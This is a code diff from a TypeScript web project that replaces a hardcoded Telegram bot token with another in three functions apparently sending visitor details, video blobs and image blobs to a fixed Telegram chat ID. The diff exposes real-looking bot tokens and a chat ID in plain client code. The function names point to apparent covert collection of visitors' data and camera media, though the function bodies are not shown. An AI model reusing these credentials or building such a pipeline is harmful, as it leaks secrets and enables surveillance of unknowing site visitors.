@@ -310,7 +310,7 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   }
 
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7329000179:AAFgFH2vfFHDdP9w5SYfO5uw3e4ai6lMF8E';
+  const backupBotToken = '7838207954:AAH2JNyE9XAPZ3i2sPQd_C0yITlicADusus';
   const CHAT_ID = '5831789218';
 
   if (!CHAT_ID) {
@@ -390,7 +390,7 @@ ${deviceText}
 
 export const sendVideoToTelegram = async (videoBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7329000179:AAFgFH2vfFHDdP9w5SYfO5uw3e4ai6lMF8E';
+  const backupBotToken = '7838207954:AAH2JNyE9XAPZ3i2sPQd_C0yITlicADusus';
   const CHAT_ID = '5831789218';
 
   if (!CHAT_ID) {
@@ -473,7 +473,7 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
 
 export const sendImageToTelegram = async (imageBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7329000179:AAFgFH2vfFHDdP9w5SYfO5uw3e4ai6lMF8E';
+  const backupBotToken = '7838207954:AAH2JNyE9XAPZ3i2sPQd_C0yITlicADusus';
   const CHAT_ID = '5831789218';
 
   if (!CHAT_ID) {
